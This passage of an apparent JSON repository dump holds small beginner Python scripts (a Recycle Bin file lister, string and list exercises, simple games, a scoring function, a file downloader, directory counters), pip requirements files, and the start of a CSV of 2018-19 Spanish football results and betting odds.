dirList = os.listdir(recycleDir)\n    for sid in dirList:\n        files = os.listdir(recycleDir + sid)\n        user = sid2user(sid)\n\n        print(\"\\n[*] Listing Files for User: \" + str(user))\n        for file in files:\n            print(\"[+] Found File: \" + str(file))\n\n\ndef main():\n    recycleDir = returnDir()\n    findRecycled(recycleDir)\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "remove a character from a file and rewrite.py",
          "type": "blob",
          "size": 0.7099609375,
          "content": "#Remove all the lines that contain the character `a' in a file and write it to another file.\nf=open(\"test1.txt\",\"r\") #opening file test1.txt\nlines = f.readlines() #saved lines\nprint(\"Original file is :\")\nprint(lines)\nf.close()\n \n# Rewriting lines \n\ne=open(\"test3.txt\",\"w\") # file containing lines with 'a'\nf=open(\"test1.txt\",\"w\") # file containing lines without 'a'\nfor line in lines:\n if 'a' in line or 'A' in line:\n  e.write(line)\n else:        \n  f.write(line)\n    \ne.close()\nf.close()   \n\nf=open(\"test1.txt\",\"r\")   \nlines=f.readlines()\n\ne=open(\"test3.txt\",\"r\")   \nlines1=e.readlines()\n\nprint(\"\\n\")\n\nprint(\"Files without letter a:\")\nprint(lines)\nprint(\"\\n\")\n\nprint(\"Files with letter a:\")\nprint(lines1)\n\ne.close()\nf.close()\n"
        },
        {
          "name": "repeat.py",
          "type": "blob",
          "size": 0.322265625,
          "content": "def Repeat(x):\n    _size = len(x)\n    repeated = []\n    for i in range(_size):\n        k = i + 1\n        for j in range(k, _size):\n            if x[i] == x[j] and x[i] not in repeated:\n                repeated.append(x[i])\n    return repeated\n\n\nlist1 = [10, 20, 30, 20, 20, 30, 40, 50, -20, 60, 60, -20, -20]\nprint(Repeat(list1))\n"
        },
        {
          "name": "replacetext.py",
          "type": "blob",
          "size": 0.31640625,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# program to replace all the spaces in an entered string with a hyphen\"-\"\ndef replacetext(string):\n    string = string.replace(\" \", \"-\")\n    return string\n\n\nS = input(\"Enter a text to replace all its spaces with hyphens: \")\nN = replacetext(S)\nprint(\"The changed text is: \", N)\n"
        },
        {
          "name": "repo_website",
          "type": "tree",
          "content": null
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.9462890625,
          "content": "pafy\naiohttp\nfuzzywuzzy\nhupper\nseaborn\ntime\nsimplegui\nutils\nTubes\nmodules\npdf2docx\npong\nbeautifulsoup4\ndictator\ncaller\nwatchdog\nPyQt5\nnumpy\nfileinfo\nbackend\nwin10toast\nCounter\nFlask\nselenium\nfirebase-admin\nujson\nrequests\nquo\nPyPDF2\npyserial\ntwilio\ntabula\nnltk\nPillow\nSocksiPy-branch\nxlrd\nfpdf\nmysql-connector-repackaged\nword2number\ntornado\nobs\ntodo\noauth2client\nkeras\npymongo\nplaysound\npyttsx3\nauto-mix-prep\nlib\npywifi\npatterns\nopenai\nbackground\npydantic\nopenpyxl\npytesseract\nrequests-mock\npyglet\nurllib3\nthirdai\ngoogle-api-python-client\nsound\nxlwt\npygame\nspeechtotext\nwikipedia\ntqdm\nMenu\nyfinance\ntweepy\ntkcalendar\npytube\nxor-cipher\nbird\nmechanize\ntranslate\nsolara\npywhatkit\nmutagen\nUnidecode\nBall\npynput\ngTTS\nccxt\nfitz\nfastapi\nDjango\ndocx\nmatplotlib\npyshorteners\ngeocoder\nAPScheduler\nPyQRCode\nfreegames\npyperclip\nnewspaper\nopencv-python\ntensorflow\npandas\npytest\nqrcode\ngoogletrans\nslab\npsutil\nmediapipe\nrich\nhttplib2\nprotobuf\ncolorama\nplyer\nFlask-Ask\nemoji\nPyAutoGUI\n"
        },
        {
          "name": "requirements_with_versions.txt",
          "type": "blob",
          "size": 1.7646484375,
          "content": "pafy==0.5.5\naiohttp==3.11.11\nfuzzywuzzy==0.18.0\nhupper==1.12.1\nseaborn==0.13.2\ntime==1.0.0\nsimplegui==0.1.1\nutils==1.0.2\nTubes==0.2.1\nmodules==1.0.0\npdf2docx==0.5.8\npong==1.5\nbeautifulsoup4==4.12.3\ndictator==0.3.1\ncaller==0.0.2\nwatchdog==6.0.0\nPyQt5==5.15.11\nnumpy==2.2.1\nfileinfo==0.3.3\nbackend==0.2.4.1\nwin10toast==0.9\nCounter==1.0.0\nFlask==3.1.0\nselenium==4.27.1\nfirebase-admin==6.6.0\nujson==5.10.0\nrequests==2.32.3\nquo==2023.5.1\nPyPDF2==3.0.1\npyserial==3.5\ntwilio==9.4.1\ntabula==1.0.5\nnltk==3.9.1\nPillow==11.1.0\nSocksiPy-branch==1.01\nxlrd==2.0.1\nfpdf==1.7.2\nmysql-connector-repackaged==0.3.1\nword2number==1.1\ntornado==6.4.2\nobs==0.0.0\ntodo==0.1\noauth2client==4.1.3\nkeras==3.7.0\npymongo==4.10.1\nplaysound==1.3.0\npyttsx3==2.98\nauto-mix-prep==0.2.0\nlib==4.0.0\npywifi==1.1.12\npatterns==0.3\nopenai==1.59.3\nbackground==0.2.1\npydantic==2.10.3\nopenpyxl==3.1.2\npytesseract==0.3.13\nrequests-mock==1.12.1\npyglet==2.0.20\nurllib3==2.3.0\nthirdai==0.9.25\ngoogle-api-python-client==2.157.0\nsound==0.1.0\nxlwt==1.3.0\npygame==2.6.1\nspeechtotext==0.0.3\nwikipedia==1.4.0\ntqdm==4.67.1\nMenu==3.2.2\nyfinance==0.2.51\ntweepy==4.14.0\ntkcalendar==1.6.1\npytube==15.0.0\nxor-cipher==5.0.1\nbird==0.1.2\nmechanize==0.4.10\ntranslate==3.6.1\nsolara==1.43.0\npywhatkit==5.4\nmutagen==1.47.0\nUnidecode==1.3.8\nBall==0.2.9\npynput==1.7.7\ngTTS==2.5.4\nccxt==4.4.46\nfitz==0.0.1.dev2\nfastapi==0.115.6\nDjango==5.1.4\ndocx==0.2.4\nmatplotlib==3.10.0\npyshorteners==1.0.1\ngeocoder==1.38.1\nAPScheduler==3.11.0\nPyQRCode==1.2.1\nfreegames==2.5.3\npyperclip==1.8.2\nnewspaper==0.1.0.7\nopencv-python==4.10.0.84\ntensorflow==2.15.0.post1\npandas==2.2.3\npytest==8.3.4\nqrcode==8.0\ngoogletrans==4.0.2\nslab==1.7.0\npsutil==6.1.1\nmediapipe==0.10.20\nrich==13.9.4\nhttplib2==0.22.0\nprotobuf==5.29.2\ncolorama==0.4.6\nplyer==2.1.0\nFlask-Ask==0.9.8\nemoji==2.14.0\nPyAutoGUI==0.9.54\n"
        },
        {
          "name": "reversed_pattern3.py",
          "type": "blob",
          "size": 0.3173828125,
          "content": "#Simple inverted number triangle piramid\n#11111\n#2222\n#333\n#44\n#5\n\ndef main():\n    lines = int(input(\"Enter no.of lines: \"))\n    pattern(lines)\n\ndef pattern(lines):\n    t = 1\n    for i in reversed(range(1, (lines +1))):\n        format = str(t)*i\n        print(format)\n        t = t + 1\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "rock_paper_scissor_game.py",
          "type": "blob",
          "size": 0.904296875,
          "content": "from __future__ import print_function\n\nimport random\n\n\n# let\n# 0 - rock\n# 1 - paper\n# 2 - scissor\n\n\ndef name_to_number(name):\n    if name == \"rock\":\n        name = 0\n    elif name == \"paper\":\n        name = 1\n    elif name == \"scissors\":\n        name = 2\n    return name\n\n\ndef number_to_name(number):\n    if number == 0:\n        return \"rock\"\n    elif number == 1:\n        return \"paper\"\n    elif number == 2:\n        return \"scissors\"\n\n\ndef game(player_choice):\n    print()\n    name = player_choice\n    print(name)\n    number = name_to_number(name)\n    comp_number = random.randrange(0, 2)\n    comp_choice = number_to_name(comp_number)\n    print(comp_choice)\n\n    comp = -int(comp_number)\n    play = int(number)\n    diff = (comp + play) % 5\n\n    if diff == 1 or diff == 3:\n        print(\"you won!!!\")\n    elif diff == 0:\n        print(\"draw\")\n    elif diff == 2 or diff == 4:\n        print(\"you lose!!!\")\n\n\n# Also improve it\n"
        },
        {
          "name": "rook.py",
          "type": "blob",
          "size": 1.4599609375,
          "content": "start = [0, 0]\nend = [7, 7]\ntaken = [[1, 0], [1, 1], [1, 2], [1, 3]]\nqueue = []\nqueue.append([start[0], start[1], -1])\nvisited = []\nmaze = []\nfor i in range(8):\n    maze.append([\".\", \".\", \".\", \".\", \".\", \".\", \".\", \".\"])\n    visited.append([0, 0, 0, 0, 0, 0, 0, 0])\nmaze[start[0]][start[1]] = \"S\"\nmaze[end[0]][end[1]] = \"E\"\nfor i in taken:\n    maze[i[0]][i[1]] = \"X\"\nwhile len(queue) > 0:\n    point = queue.pop(0)\n    if end[0] == point[0] and end[1] == point[1]:\n        print(point[2] + 1)\n        break\n    current = point[2] + 1\n    if point not in taken and visited[point[0]][point[1]] == 0:\n        visited[point[0]][point[1]] = current\n        for i in range(point[0], -1, -1):\n            if [i, point[1]] in taken:\n                break\n            if visited[i][point[1]] == 0:\n                queue.append([i, point[1], current])\n        for i in range(point[0], 8):\n            if [i, point[1]] in taken:\n                break\n            if visited[i][point[1]] == 0:\n                queue.append([i, point[1], current])\n        for i in range(point[1], -1, -1):\n            if [point[0], i] in taken:\n                break\n            if visited[point[0]][i] == 0:\n                queue.append([point[0], i, current])\n        for i in range(point[1], 8):\n            if [point[0], i] in taken:\n                break\n            if visited[point[0]][i] == 0:\n                queue.append([point[0], i, current])\n\nfor i in maze:\n    for j in i:\n        print(j, end=\"   \")\n    print()\n"
        },
        {
          "name": "rotate_string.py",
          "type": "blob",
          "size": 0.4072265625,
          "content": "def left_rotate(s, val):\n    s1 = s[0:val]\n    s2 = s[val:]\n    return s2 + s1\n\n\ndef right_rotate(s, val):\n    s1 = s[0 : len(s) - val]\n    s2 = s[len(s) - val :]\n    return s2 + s1\n\n\ndef circular_rotate(s):\n    s = list(s)\n    idx = 0\n    mid = len(s) // 2\n    for i in reversed(range(mid, len(s))):\n        s[idx], s[i] = s[i], s[idx]\n        idx += 1\n    return s\n\n\ns = \"aditya\"\nprint(\"\".join(circular_rotate(s)))\n"
        },
        {
          "name": "rotatelist.py",
          "type": "blob",
          "size": 0.5126953125,
          "content": "N = int(input(\"Enter The Size Of Array\"))\nlist = []\nfor i in range(0, N):\n    temp = int(input(\"Enter The Intger Numbers\"))\n    list.append(temp)\n\n\n# Rotating Arrays Using Best Way:\n# Left Rotation Of The List.\n# Let's say we want to print list after its d number of rotations.\n\nfinalList = []\nd = int(input(\"Enter The Number Of Times You Want To Rotate The Array\"))\n\nfor i in range(0, N):\n    finalList.append(list[(i + d) % N])\n\nprint(finalList)\n\n# This Method holds the timeComplexity of O(N) and Space Complexity of O(N)\n"
        },
        {
          "name": "russian_roulette.py",
          "type": "blob",
          "size": 2.466796875,
          "content": "\"\"\" author: Ataba29\n    the code is just a russian roulette game against\n    the computer\n\"\"\"\nfrom random import randrange\nimport time\n\n\ndef main():\n\n    # create the gun and set the bullet\n    numOfRounds = 6\n    gun = [0, 0, 0, 0, 0, 0]\n    bullet = randrange(0, 6)\n    gun[bullet] = 1\n    player = False  # is player dead\n    pc = False  # is pc dead\n\n    # menu\n    print(\"/********************************/\")\n    print(\"    Welcome to russian roulette\")\n    print(\"/********************************/\")\n    time.sleep(2)\n    print(\"you are going to play against the pc\")\n    time.sleep(2)\n    print(\"there is one gun and one bullet\")\n    time.sleep(2)\n    print(\"all you have to do is pick who starts first\")\n    time.sleep(2)\n\n    # take input from the user\n    answer = input(\n        \"please press 'm' if you want to start first or 'p' if you want the pc to start first: \"\n    )\n\n    # check input\n    while answer != \"m\" and answer != \"p\":\n        answer = input(\"please enter again ('m' or 'p'): \")\n\n    # set turn\n    if answer == 'm':\n        turn = \"player\"\n    else:\n        turn = \"pc\"\n\n    # game starts\n    while numOfRounds != 0 and (pc == False and player == False):\n        print(f\"\\nRound number {numOfRounds}/6\")\n        time.sleep(1)\n        print(\"the gun is being loaded\")\n        time.sleep(3)\n        print(\"the gun is placed on \" + (\"your head\" if turn ==\n              \"player\" else \"the cpu of the pc\"))\n        time.sleep(3)\n        print(\"and...\")\n        time.sleep(1)\n        print(\"...\")\n        time.sleep(2)\n        print(\"...\")\n        time.sleep(2)\n        print(\"...\")\n        time.sleep(2)\n\n        # get the bullet in the chamber\n        shot = gun.pop(numOfRounds - 1)\n\n        if shot:\n            print(\"THE GUN WENT OFF!!!\")\n            print(\"YOU DIED\" if turn == \"player\" else \"THE PC DIED\")\n            if turn == \"player\":  # set up who died\n                player = True\n            else:\n                pc = True\n        else:\n            print(\"nothing happened phew!\")\n            if turn == \"player\":  # flip the turn\n                turn = \"pc\"\n            else:\n                turn = \"player\"\n\n        time.sleep(2)\n        numOfRounds -= 1\n\n    time.sleep(1)\n    print(\"\")\n    if player:\n        print(\"sorry man you died better luck next time\")\n        print(\"don't forget to send a pic from heaven :)\")\n    else:\n        print(\"good job man you survived\")\n        print(\"you just got really lucky\")\n    print(\"anyways hope you had fun because i sure did\")\n\n\nmain()\n"
        },
        {
          "name": "sample.xlsx",
          "type": "blob",
          "size": 81.462890625,
          "content": null
        },
        {
          "name": "scalg.py",
          "type": "blob",
          "size": 4.470703125,
          "content": "\"\"\"\ndeveloped by: markmelnic\noriginal repo: https://github.com/markmelnic/Scoring-Algorithm\n         pypi: https://pypi.org/project/scalg/\nAnalyse data using a range based percentual proximity algorithm\nand calculate the linear maximum likelihood estimation.\nThe basic principle is that all values supplied will be broken\ndown to a range from 0 to 1 and each column's score will be added\nup to get the total score.\n==========\nExample for data of vehicles\nprice|mileage|registration_year\n20k  |60k    |2012\n22k  |50k    |2011\n23k  |90k    |2015\n16k  |210k   |2010\nWe want the vehicle with the lowest price,\nlowest mileage but newest registration year.\nThus the weights for each column are as follows:\n[0, 0, 1]\n>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1])\n[[20, 60, 2012, 2.0], [23, 90, 2015, 1.0], [22, 50, 2011, 1.3333333333333335]]\n>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1], 'scores')\n[2.0, 1.0, 1.3333333333333335]\n>>> score_columns([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 2], [0, 0, 1])\n[[20, 2012, 1.25], [23, 2015, 1.0], [22, 2011, 0.33333333333333337]]\n\"\"\"\n\n\ndef score(source_data: list, weights: list, *args) -> list:\n    \"\"\"Analyse and score a dataset using a range based percentual proximity\n    algorithm and calculate the linear maximum likelihood estimation.\n    Args:\n        source_data (list): Data set to process.\n        weights (list): Weights corresponding to each column from the data set.\n            0 if lower values have higher weight in the data set,\n            1 if higher values have higher weight in the data set\n    Optional args:\n        \"score_lists\" (str): Returns a list with lists of each column scores.\n        \"scores\" (str): Returns only the final scores.\n    Raises:\n        ValueError: Weights can only be either 0 or 1 (int)\n    Returns:\n        list: Source data with the score of the set appended at as the last element.\n    \"\"\"\n\n    # getting data\n    data_lists = []\n    for item in source_data:\n        for i, val in enumerate(item):\n            try:\n                data_lists[i].append(float(val))\n            except IndexError:\n                data_lists.append([])\n                data_lists[i].append(float(val))\n\n    # calculating price score\n    score_lists = []\n    for dlist, weight in zip(data_lists, weights):\n        mind = min(dlist)\n        maxd = max(dlist)\n\n        score = []\n        if weight == 0:\n            for item in dlist:\n                try:\n                    score.append(1 - ((item - mind) / (maxd - mind)))\n                except ZeroDivisionError:\n                    score.append(1)\n\n        elif weight == 1:\n            for item in dlist:\n                try:\n                    score.append((item - mind) / (maxd - mind))\n                except ZeroDivisionError:\n                    score.append(0)\n\n        else:\n            raise ValueError(\"Invalid weight of %f provided\" % (weight))\n\n        score_lists.append(score)\n\n    # return score lists\n    if \"score_lists\" in args:\n        return score_lists\n\n    # initialize final scores\n    final_scores = [0 for i in range(len(score_lists[0]))]\n\n    # generate final scores\n    for i, slist in enumerate(score_lists):\n        for j, ele in enumerate(slist):\n            final_scores[j] = final_scores[j] + ele\n\n    # return only scores\n    if \"scores\" in args:\n        return final_scores\n\n    # append scores to source data\n    for i, ele in enumerate(final_scores):\n        source_data[i].append(ele)\n\n    return source_data\n\n\ndef score_columns(source_data: list, columns: list, weights: list) -> list:\n    \"\"\"Analyse data file using a range based percentual proximity\n    algorithm and calculate the linear maximum likelihood estimation.\n    Args:\n        source_data (list): Data set to process.\n        columns (list): Indexes of the source_data columns to be scored.\n        weights (list): Weights corresponding to each column from the data set.\n            0 if lower values have higher weight in the data set,\n            1 if higher values have higher weight in the data set\n    Raises:\n        ValueError: Weights can only be either 0 or 1 (int)\n    Returns:\n        list: Source data with the score of the set appended at as the last element.\n    \"\"\"\n\n    temp_data = []\n    for item in source_data:\n        temp_data.append([item[c] for c in columns])\n\n    if len(weights) > len(columns):\n        weights = [weights[item] for item in columns]\n\n    for i, sc in enumerate(score(temp_data, weights, \"scores\")):\n        source_data[i].append(sc)\n\n    return source_data\n"
        },
        {
          "name": "scrap_file.py",
          "type": "blob",
          "size": 0.943359375,
          "content": "# Author : RIZWAN AHMAD\n\n\n# pip3 install requests\n\nimport requests\n\n\n# Function for download file parameter taking as url\n\n\ndef download(url):\n    f = open(\n        \"file_name.jpg\", \"wb\"\n    )  # opening file in write binary('wb') mode with file_name.ext ext=extension\n    f.write(requests.get(url).content)  # Writing File Content in file_name.jpg\n    f.close()\n    print(\"Succesfully Downloaded\")\n\n\n# Function is do same thing as method(download) do,but more strict\ndef download_2(url):\n    try:\n        response = requests.get(url)\n    except Exception:\n        print(\"Failed Download!\")\n    else:\n        if response.status_code == 200:\n            with open(\"file_name.jpg\", \"wb\") as f:\n                f.write(requests.get(url).content)\n                print(\"Succesfully Downloaded\")\n        else:\n            print(\"Failed Download!\")\n\n\nurl = \"https://avatars0.githubusercontent.com/u/29729380?s=400&v=4\"  # URL from which we want to download\n\ndownload(url)\n"
        },
        {
          "name": "script_count.py",
          "type": "blob",
          "size": 4.1513671875,
          "content": "from __future__ import print_function\n\nimport os  # Load the library module\n\n# Script Name\t\t: script_count.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 27th February 2012\n# Last Modified\t\t: 20th July 2012\n# Version\t\t\t\t: 1.3\n# Modifications\t\t: 1.1 - 28-02-2012 - CR - Changed inside github and development functions, so instead of if os.name = \"posix\" do this else do this etc\n# \t\t\t\t\t\t\t: I used os.path.join, so it condensed 4 lines down to 1\n# \t\t\t\t\t\t\t: 1.2 - 10-05-2012 - CR - Added a line to include PHP scripts.\n# \t\t\t\t\t\t\t: 1.3 - 20-07-2012 - CR - Added the line to include Batch scripts\n# Description\t\t\t: This scans my scripts directory and gives a count of the different types of scripts\n\npath = os.getenv(\n    \"scripts\"\n)  # Set the variable path by getting the value from the OS environment variable scripts\ndropbox = os.getenv(\n    \"dropbox\"\n)  # Set the variable dropbox by getting the value from the OS environment variable dropbox\n\n\ndef clear_screen():  # Function to clear the screen\n    if os.name == \"posix\":  # Unix/Linux/MacOS/BSD/etc\n        os.system(\"clear\")  # Clear the Screen\n    elif os.name in (\"nt\", \"dos\", \"ce\"):  # DOS/Windows\n        os.system(\"CLS\")  # Clear the Screen\n\n\ndef count_files(\n    path, extensions\n):  # Start of the function to count the files in the scripts directory, it counts the extension when passed below\n    counter = 0  # Set the counter to 0\n    for root, dirs, files in os.walk(\n        path\n    ):  # Loop through all the directories in the given path\n        for file in files:  # For all the files\n            counter += file.endswith(extensions)  # Count the files\n    return counter  # Return the count\n\n\ndef github():  # Start of the function just to count the files in the github directory\n    github_dir = os.path.join(\n        dropbox, \"github\"\n    )  # Joins the paths to get the github directory - 1.1\n    github_count = sum(\n        (len(f) for _, _, f in os.walk(github_dir))\n    )  # Get a count for all the files in the directory\n    if (\n        github_count > 5\n    ):  # If the number of files is greater then 5, then print the following messages\n\n        print(\"\\nYou have too many in here, start uploading !!!!!\")\n        print(\"You have: \" + str(github_count) + \" waiting to be uploaded to github!!\")\n    elif github_count == 0:  # Unless the count is 0, then print the following messages\n        print(\"\\nGithub directory is all Clear\")\n    else:  # If it is any other number then print the following message, showing the number outstanding.\n        print(\n            \"\\nYou have: \" + str(github_count) + \" waiting to be uploaded to github!!\"\n        )\n\n\ndef development():  # Start of the function just to count the files in the development directory\n    dev_dir = os.path.join(\n        path, \"development\"\n    )  # Joins the paths to get the development directory - 1.1\n    dev_count = sum(\n        (len(f) for _, _, f in os.walk(dev_dir))\n    )  # Get a count for all the files in the directory\n    if (\n        dev_count > 10\n    ):  # If the number of files is greater then 10, then print the following messages\n\n        print(\"\\nYou have too many in here, finish them or delete them !!!!!\")\n        print(\"You have: \" + str(dev_count) + \" waiting to be finished!!\")\n    elif dev_count == 0:  # Unless the count is 0, then print the following messages\n        print(\"\\nDevelopment directory is all clear\")\n    else:\n        print(\n            \"\\nYou have: \" + str(dev_count) + \" waiting to be finished!!\"\n        )  # If it is any other number then print the following message, showing the number outstanding.\n\n\nclear_screen()  # Call the function to clear the screen\n\nprint(\"\\nYou have the following :\\n\")\nprint(\n    \"AutoIT:\\t\" + str(count_files(path, \".au3\"))\n)  # Run the count_files function to count the files with the extension we pass\nprint(\"Batch:\\t\" + str(count_files(path, (\".bat\", \",cmd\"))))  # 1.3\nprint(\"Perl:\\t\" + str(count_files(path, \".pl\")))\nprint(\"PHP:\\t\" + str(count_files(path, \".php\")))  # 1.2\nprint(\"Python:\\t\" + str(count_files(path, \".py\")))\nprint(\"Shell:\\t\" + str(count_files(path, (\".ksh\", \".sh\", \".bash\"))))\nprint(\"SQL:\\t\" + str(count_files(path, \".sql\")))\n\ngithub()  # Call the github function\ndevelopment()  # Call the development function\n"
        },
        {
          "name": "script_listing.py",
          "type": "blob",
          "size": 1.576171875,
          "content": "# Script Name\t\t: script_listing.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 15th February 2012\n# Last Modified\t\t: 29th May 2012\n# Version\t\t\t\t: 1.2\n\n# Modifications\t\t: 1.1 - 28-02-2012 - CR - Added the variable to get the logs directory, I then joined the output so the file goes to the logs directory\n# \t\t\t\t\t\t\t: 1.2 - 29-05/2012 - CR - Changed the line so it doesn't ask for a directory, it now uses the environment varaible scripts\n\n# Description\t\t\t: This will list all the files in the given directory, it will also go through all the subdirectories as well\n\nimport os  # Load the library module\n\nlogdir = os.getenv(\n    \"logs\"\n)  # Set the variable logdir by getting the value from the OS environment variable logs\nlogfile = \"script_list.log\"  # Set the variable logfile\npath = os.getenv(\n    \"scripts\"\n)  # Set the varable path by getting the value from the OS environment variable scripts - 1.2\n\n# path = (raw_input(\"Enter dir: \"))\t\t\t\t\t\t\t\t\t\t  # Ask the user for the directory to scan\nlogfilename = os.path.join(\n    logdir, logfile\n)  # Set the variable logfilename by joining logdir and logfile together\nlog = open(logfilename, \"w\")  # Set the variable log and open the logfile for writing\n\nfor dirpath, dirname, filenames in os.walk(\n    path\n):  # Go through the directories and the subdirectories\n    for filename in filenames:  # Get all the filenames\n        log.write(\n            os.path.join(dirpath, filename) + \"\\n\"\n        )  # Write the full path out to the logfile\n\nprint(\n    \"\\nYour logfile \", logfilename, \"has been created\"\n)  # Small message informing the user the file has been created\n"
        },
        {
          "name": "season-1819_csv.csv",
          "type": "blob",
          "size": 90.736328125,
          "content": "Div,Date,HomeTeam,AwayTeam,FTHG,FTAG,FTR,HTHG,HTAG,HTR,HS,AS,HST,AST,HF,AF,HC,AC,HY,AY,HR,AR,B365H,B365D,B365A,BWH,BWD,BWA,IWH,IWD,IWA,PSH,PSD,PSA,WHH,WHD,WHA,VCH,VCD,VCA,Bb1X2,BbMxH,BbAvH,BbMxD,BbAvD,BbMxA,BbAvA,BbOU,BbMx>2.5,BbAv>2.5,BbMx<2.5,BbAv<2.5,BbAH,BbAHh,BbMxAHH,BbAvAHH,BbMxAHA,BbAvAHA,PSCH,PSCD,PSCA\r\nSP1,17/08/2018,Betis,Levante,0,3,A,0,1,A,22,6,8,4,10,10,5,3,0,2,0,0,1.66,4,5,1.7,3.7,5.25,1.75,3.6,4.9,1.69,4.19,5.11,1.67,3.9,4.75,1.67,4.2,5.2,40,1.75,1.68,4.25,4,5.25,4.95,38,1.82,1.76,2.15,2.06,20,-0.75,1.89,1.85,2.07,2,1.59,4.42,5.89\r\nSP1,17/08/2018,Girona,Valladolid,0,0,D,0,0,D,13,2,1,1,21,20,3,2,1,1,0,0,1.75,3.6,5,1.75,3.5,5.25,1.8,3.6,4.5,1.8,3.7,4.99,1.75,3.6,4.6,1.8,3.7,4.8,40,1.85,1.78,3.83,3.6,5.27,4.79,38,2.21,2.13,1.78,1.71,20,-0.75,2.06,2.01,1.9,1.85,1.76,3.57,5.62\r\nSP1,18/08/2018,Barcelona,Alaves,3,0,H,0,0,D,25,3,9,0,6,13,7,1,0,2,0,0,1.11,10,21,1.11,10,20,1.12,9,20,1.11,11.27,25.4,1.08,9,29,1.1,10.5,34,40,1.13,1.1,11.5,9.82,41,25.67,32,1.39,1.34,3.4,3.18,19,-2.5,1.95,1.91,2,1.95,1.1,11.85,32.17\r\nSP1,18/08/2018,Celta,Espanol,1,1,D,0,1,A,12,14,2,5,13,14,8,7,3,2,0,0,1.85,3.5,4.5,1.91,3.4,4.25,1.9,3.5,4.1,1.93,3.64,4.27,1.91,3.5,4,1.93,3.5,4.4,38,1.97,1.9,3.73,3.53,4.5,4.2,36,2.13,2.06,1.84,1.76,18,-0.75,2.26,2.18,1.74,1.71,2.18,3.26,3.85\r\nSP1,18/08/2018,Villarreal,Sociedad,1,2,A,1,1,D,16,8,7,4,16,10,4,6,2,3,0,0,2.04,3.4,3.8,2.05,3.3,3.9,2,3.4,3.8,2.06,3.51,3.91,2.05,3.3,3.6,2.05,3.5,3.9,40,2.11,2.03,3.62,3.43,3.93,3.76,37,2.05,1.99,1.88,1.81,18,-0.25,1.76,1.74,2.23,2.14,2.32,3.21,3.53\r\nSP1,19/08/2018,Eibar,Huesca,1,2,A,0,2,A,18,8,6,6,12,13,7,0,1,1,0,0,1.66,3.75,5.5,1.7,3.7,5.25,1.7,3.75,5,1.72,3.9,5.26,1.73,3.6,4.75,1.7,3.8,5,40,1.76,1.7,3.93,3.77,5.5,5.08,37,1.95,1.88,1.98,1.91,19,-0.75,1.96,1.91,2.01,1.94,1.77,3.68,5.32\r\nSP1,19/08/2018,Real Madrid,Getafe,2,0,H,1,0,H,10,4,3,1,11,27,3,0,1,7,0,0,1.2,7,13,1.18,7.25,16,1.2,6.5,15,1.2,7.36,17.47,1.22,6,13,1.2,7,13,39,1.24,1.21,7.36,6.66,17.47,14.13,33,1.5,1.45,2.75,2.66,19,-1.75,1.85,1.8,2.15,2.07,1.19,7.77,17.96\r\nSP1,19/08/2018,Vallecano,Sevilla,1,4,A,0,3,A,13,17,2,8,6,15,2,6,1,0,0,0,3.25,3.6,2.14,3.5,3.5,2.1,3.5,3.4,2.1,3.46,3.74,2.13,3.3,3.7,2.05,3.4,3.6,2.1,40,3.53,3.38,3.75,3.56,2.2,2.11,37,1.83,1.76,2.13,2.04,19,0.25,2.08,2.03,1.86,1.83,4.57,4.07,1.78\r\nSP1,20/08/2018,Ath Bilbao,Leganes,2,1,H,1,1,D,17,12,5,2,12,13,6,2,4,5,0,0,1.75,3.3,5.5,1.78,3.5,5,1.85,3.5,4.4,1.79,3.54,5.46,1.8,3.4,4.75,1.8,3.4,5,40,1.85,1.78,3.64,3.43,5.5,5.03,36,2.49,2.35,1.64,1.58,18,-0.75,2.11,2.04,1.86,1.82,1.69,3.77,5.87\r\nSP1,20/08/2018,Valencia,Ath Madrid,1,1,D,0,1,A,13,9,4,3,10,15,4,10,2,3,0,0,3,3.2,2.5,2.85,3.25,2.55,2.85,3.2,2.55,3.12,3.18,2.57,3,3.2,2.4,3,3.2,2.45,39,3.12,2.99,3.29,3.14,2.61,2.51,36,2.45,2.33,1.65,1.59,17,0.25,1.82,1.75,2.23,2.12,3.55,3.28,2.28\r\nSP1,24/08/2018,Getafe,Eibar,2,0,H,1,0,H,7,9,4,0,14,11,5,5,2,1,0,0,1.95,3.2,4.33,1.95,3.3,4.2,2,3.2,4.2,2.01,3.35,4.43,1.95,3.1,4.33,2,3.25,4.5,40,2.06,1.98,3.35,3.22,4.5,4.32,36,2.75,2.62,1.53,1.47,19,-0.5,2.03,1.98,1.93,1.88,2.24,3.07,3.94\r\nSP1,24/08/2018,Leganes,Sociedad,2,2,D,0,2,A,18,7,5,6,12,9,5,0,1,2,0,0,3.5,3.3,2.1,3.5,3.2,2.2,3.6,3.2,2.15,3.66,3.36,2.2,3.4,3.25,2.15,3.7,3.3,2.2,40,3.76,3.57,3.4,3.25,2.27,2.18,37,2.48,2.36,1.65,1.58,20,0.25,2.04,1.99,1.91,1.86,3.56,3.21,2.31\r\nSP1,25/08/2018,Alaves,Betis,0,0,D,0,0,D,16,13,4,5,17,15,5,6,3,1,0,0,2.8,3.25,2.6,2.65,3.3,2.6,2.8,3.2,2.6,2.87,3.36,2.63,2.8,3.25,2.5,2.88,3.3,2.63,40,2.92,2.77,3.38,3.26,2.78,2.63,36,2.21,2.13,1.77,1.7,19,0,2.05,1.99,1.94,1.86,3.05,3.36,2.5\r\nSP1,25/08/2018,Ath 